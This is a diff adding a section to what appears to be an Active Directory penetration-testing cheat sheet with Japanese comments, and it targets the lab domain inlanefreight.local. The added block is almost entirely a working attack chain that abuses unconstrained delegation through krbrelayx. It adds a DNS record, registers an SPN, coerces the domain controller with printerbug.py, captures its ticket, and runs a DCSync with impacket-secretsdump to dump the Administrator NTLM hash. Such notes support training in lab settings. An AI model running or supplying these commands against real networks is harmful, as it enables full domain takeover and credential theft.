@@ -1141,6 +1141,28 @@ https://github.com/jtmpu/PrecompiledBinaries/blob/master/SpoolSample.exe
 
 dir \\dc01.inlanefreight.local\c$
 ```
+#### krbrelayx
+https://github.com/dirkjanm/krbrelayx
+```bash
+# 制約なし委任されてるUserへのGenericWriteがあればいける
+## DNS
+python dnstool.py -u INLANEFREIGHT.LOCAL\\genWuser -p passwd -r my.INLANEFREIGHT.LOCAL -d 10.10.14.224 --action add 10.129.205.35
+# SPN registered
+## vim /etc/hosts to connect to the dc01
+python addspn.py -u inlanefreight.local\\genWuser -p passwd --target-type samname -t sqldev -s CIFS/my.inlanefreight.local dc01.inlanefreight.local
+
+# recov tgt in tgs
+python krbrelayx.py -s user -p 
+python krbrelayx.py -s user -hashes :NTLM 
+
+#printerBUG 
+python printerbug.py inlanefreight.local/genWuer:passwd@10.129.205.35 my.inlanefreight.local
+
+# DCsync
+export KRB5CCNAME=./Administrator.ccache
+impacket-secretsdump dc01.INLANEFREIGHT.LOCAL -k -no-pass -just-dc-user Administrator -just-dc-ntlm
+```
+
 #### RBCD
 https://github.com/Kevin-Robertson/Powermad
 <br/>
